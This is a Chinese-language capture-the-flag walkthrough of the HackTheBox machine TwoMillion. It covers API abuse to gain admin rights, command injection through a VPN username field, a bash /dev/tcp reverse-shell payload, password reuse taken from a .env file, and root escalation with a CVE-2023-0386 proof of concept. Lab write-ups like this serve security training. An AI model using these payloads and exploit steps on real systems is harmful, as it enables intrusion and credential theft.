---
title: HackTheBox-TwoMillion
published: 2026-10-17T10:30:00
description: 靶场从ROT13邀请码接口注册，枚举API伪造管理员，VPN接口命令注入获www-data，读.env复用密码SSH登录admin，利用CVE-2023-0386提权root。
tags:
  - HackTheBox
  - 靶场
category: 网络安全
draft: false
---

```
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

只有一个登录，现在要扫描发现可用其他目录

```
ffuf -u http://2million.htb/FUZZ \ 
-w /usr/share/wordlists/dirb/common.txt \
-o ffuf_2million.html -of html \
-fc 301

404                     [Status: 200, Size: 1674, Words: 118, Lines: 46, Duration: 215ms]
api                     [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 199ms]
home                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 231ms]
invite                  [Status: 200, Size: 3859, Words: 1363, Lines: 97, Duration: 275ms]
login                   [Status: 200, Size: 3704, Words: 1365, Lines: 81, Duration: 237ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 267ms]
register                [Status: 200, Size: 4527, Words: 1512, Lines: 95, Duration: 165ms]
```

有注册和api，注册账号发现还是需要邀请码

F12查看引用了此js：`/js/inviteapi.min.js`

```
'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),
```

直接在控制台调用makeInviteCode进行尝试：

```
makeInviteCode(); 
Object { 0: 200, success: 1, data: {…}, hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..." }
​
0: 200
​
data: Object { data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr", enctype: "ROT13" }
```

需要使用ROT13进行解码，恢复内容为：`In order to generate the invite code, make a POST request to /api/v1/invite/generate`

访问提示方法不被允许，在bash使用POST进行请求

```
curl -X POST http://2million.htb/api/v1/invite/generate                          
{"0":200,"success":1,"data":{"code":"VE1VTkgtWFhOV0wtMzdHWVMtNEg3S1c=","format":"encoded"}}  
```

使用Base64再次进行解码：

```
echo "VE1VTkgtWFhOV0wtMzdHWVMtNEg3S1c=" | base64 -d                                    
TMUNH-XXNWL-37GYS-4H7KW 
```

控制台进行验证：

```
verifyInviteCode('TMUNH-XXNWL-37GYS-4H7KW');
```

无法进行填写，返回到`invite`，之后再进行注册就可以了

登录之后，提示数据库正在维护，很多功能都不可用，只有labs的access是“活页面”，生成包进行连接会失败，所以只能抓包查看有没有更多信息了

抓包请求路径`/api`，返回：

```
"\/api\/v1":"Version 1 of the API"
```

请求路径`/api/v1`，返回了完整的api信息：

```
{
	"v1": {
		"user": {
			"GET": {
				"\/api\/v1": "Route List",
				"\/api\/v1\/invite\/how\/to\/generate": "Instructions on invite code generation",
				"\/api\/v1\/invite\/generate": "Generate invite code",
				"\/api\/v1\/invite\/verify": "Verify invite code",
				"\/api\/v1\/user\/auth": "Check if user is authenticated",
				"\/api\/v1\/user\/vpn\/generate": "Generate a new VPN configuration",
				"\/api\/v1\/user\/vpn\/regenerate": "Regenerate VPN configuration",
				"\/api\/v1\/user\/vpn\/download": "Download OVPN file"
			},
			"POST": {
				"\/api\/v1\/user\/register": "Register a new user",
				"\/api\/v1\/user\/login": "Login with existing user"
			}
		},
		"admin": {
			"GET": {
				"\/api\/v1\/admin\/auth": "Check if user is admin"
			},
			"POST": {
				"\/api\/v1\/admin\/vpn\/generate": "Generate VPN for specific user"
			},
			"PUT": {
				"\/api\/v1\/admin\/settings\/update": "Update user settings"
			}
		}
	}
}
```

`/api/v1/user/auth`，返回：

```
{"loggedin":true,"username":"admin","is_admin":0}
```

枚举管理员api，返回：

```
{"message":false}
```

修改为PUT方式，`/api/v1/admin/settings/update`，返回：

```
{"status":"danger","message":"Invalid content type."}
```

在数据包添加：`Content-Type:application/json`，返回信息提示需要邮箱，添加后又提示需要`is_admin`的参数

```
{
	"email":"admin@root.com",
	"is_admin":1
}
```

在访问admin的申请vpn时，按照返回的内容补全username之后，不再提示未授权，而是回显出了一些配置语言/格式：

```
{
	"username":"admin; id #",
	"email":"admin@root.com",
	"is_admin":1
}

// 回显
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
```

尝试命令注入，`;` 分隔命令，`#` 注释掉后面原本的JSON或者其他残留内容

```
"username":"admin; id #"

// 回显
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

接下来就是反弹shell

```
{
	"username":"admin; bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1' #"
}
```

生成一个伪终端：

```
└─$ nc -lvvp 4444                                    
listening on [any] 4444 ...
connect to [10.10.17.118] from 2million.htb [10.129.229.66] 36546
bash: cannot set terminal process group (1094): Inappropriate ioctl for device
bash: no job control in this shell

script /dev/null -c bash
CTRL+Z挂起
stty raw -echo; fg
reset
screen
```

```
ls -la

cat .env

DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

```
ssh admin@2million.htb
密码输入上面的
cat user.txt
```

```
admin@2million:~$ ls -la /var
total 56
drwxr-xr-x 14 root root   4096 Jun  6  2023 .
drwxr-xr-x 19 root root   4096 Jun  6  2023 ..
drwxr-xr-x  2 root root   4096 Oct 17 02:34 backups
drwxr-xr-x 14 root root   4096 Jun  6  2023 cache
drwxrwxrwt  2 root root   4096 Feb 17  2023 crash
drwxr-xr-x 43 root root   4096 Jun  6  2023 lib
drwxrwsr-x  2 root staff  4096 Apr 18  2022 local
lrwxrwxrwx  1 root root      9 Feb 17  2023 lock -> /run/lock
drwxrwxr-x 12 root syslog 4096 Oct 17 02:27 log
drwxrwsr-x  2 root mail   4096 Jun  2  2023 mail
drwxr-xr-x  2 root root   4096 Feb 17  2023 opt
lrwxrwxrwx  1 root root      4 Feb 17  2023 run -> /run
drwxr-xr-x  5 root root   4096 Feb 17  2023 snap
drwxr-xr-x  4 root root   4096 Feb 17  2023 spool
drwxrwxrwt  7 root root   4096 Oct 17 04:09 tmp
drwxr-xr-x  3 root root   4096 Jun  6  2023 www
```

```
admin@2million:~$ cat /var/mail/admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

## root提权

```
admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
admin@2million:~$ cat /etc/lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.2 LTS"
```

内核版本`5.15.70`，Ubuntu版本`22.04`，查找2023 CVE Overlay相关

## CVE-2023-0386

漏洞的核心在于，OverlayFS在将文件从**低层（lower）** 文件系统（通常是只读的）**复制（copy-up）** 到**高层（upper）** 文件系统（可写）时，未能正确检查文件的**UID/GID映射**和权限位。一个本地低权限用户可以利用此缺陷，将一个带有`setuid`权限或特定`capabilities`的恶意文件从`nosuid`挂载点“走私”到另一个挂载点，从而在系统上以root权限执行该文件，实现提权

```
# 1. 下载 PoC
git clone https://github.com/xkaneiki/CVE-2023-0386.git
cd CVE-2023-0386

# 2. 下载并安装 FUSE2 开发包（kali 官方链接已 404，用这个）
wget https://repo2.vanillaos.org/pool/main/f/fuse/libfuse-dev_2.9.9-9_amd64.deb
sudo dpkg -i --force-depends libfuse-dev_2.9.9-9_amd64.deb

# 3. 清理可能残留的 FUSE3 兼容头（会导致找不到 fuse_common.h）
sudo rm -f /usr/include/fuse.h
sudo rm -rf /usr/include/fuse

# 4. 重新强制安装，把 FUSE2 头文件写回 /usr/include/fuse/
sudo dpkg -i --force-depends libfuse-dev_2.9.9-9_amd64.deb

# 5. 安装 libcap 开发包（exp.c 需要 sys/capability.h）
sudo apt install libcap-dev

# 6. 给 fuse.c 补上 unistd.h（原代码缺 read/close/rmdir 声明）
sed -i '1i #include <unistd.h>' fuse.c

# 7. 编译
make all
```

开启http服务，靶机下载编译后的三个文件

```
# 靶机 admin shell
cd /tmp
wget http://ip:8000/fuse -O fuse
wget http://ip:8000/exp -O exp
wget http://ip:8000/gc -O gc
chmod +x fuse exp gc
```

后续执行时，`fuse` 需要配合 `ovlcap/lower` 目录结构。原 PoC 仓库里自带 `ovlcap/`，上传时建议把整个目录打包传过去，或者先在靶机建好 `ovlcap/lower` 目录：

```
mkdir -p /tmp/ovlcap/lower
```

开启两个admin shell

shell 0：

```
./fuse ./ovlcap/lower ./gc
```

shell 1：

```
./exp
```

完成提权到root

## 彩蛋

`thank_you.json`，是一个**三层编码**的 flag 文件：

1. 输入完整的 `{"encoding": "url", "data": "%7B..."}`。
    
2. Recipe 依次加：
    
    - **URL Decode**
        
    - **From Hex**
        
3. 这时 Output 应该出现类似：
    
```
{"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "..."}
```
	
4. 复制其中 `data` 字段那一长串 Base64，**不要带引号**。
    
5. 新建一个 CyberChef 输入，Recipe：
    
    - **From Base64**
        
    - **XOR**，Key 填 `HackTheBox`，Key 格式选 **UTF-8**

```
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```